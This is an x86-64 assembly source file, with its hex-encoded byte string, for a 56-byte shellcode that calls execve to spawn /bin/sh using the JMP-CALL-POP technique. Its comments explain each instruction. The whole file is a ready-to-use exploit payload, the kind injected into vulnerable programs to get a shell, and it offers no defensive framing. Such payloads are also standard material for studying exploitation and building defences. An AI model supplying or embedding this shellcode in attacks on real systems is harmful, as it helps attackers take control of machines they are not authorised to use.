; Author: Robert C. Raducioiu
; Shellcode: "\x31\xc0\xeb\x17\x5f\x48\x8d\x77\x08\x48\x8d\x57\x10\x88\x47\x07\x48\x89\x3e\x48\x89\x02\x83\xc0\x3b\x0f\x05\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43";
; Shellcode length: 56 bytes

global _start

section .text

_start:

    ; clear RAX
    xor eax, eax

    ; use the JMP-CALL-POP technique to get the address of shellcode
    jmp short CallRunShellcode

RunShellcode:

    ; 1st argument of execve: path to the executable to run
    pop rdi

    ; 2nd argument of execve: array of arguments passed to the executable
    lea rsi, [rdi + 8]

    ; 3rd argument of execve: envp (in this case a pointer to a NULL QWORD)
    lea rdx, [rdi + 16]

    ; replace 'A' with a NULL byte (string terminator)
    mov [rdi + 7], BYTE al

    ; replace BBBBBBBB with the address of /bin/sh
    mov [rsi], rdi

    ; replace CCCCCCCC with a NULL QWORD
    mov [rdx], rax

    add eax, 0x3b
    syscall

CallRunShellcode:

    call RunShellcode
    shellcode: db "/bin/shABBBBBBBBCCCCCCCC"
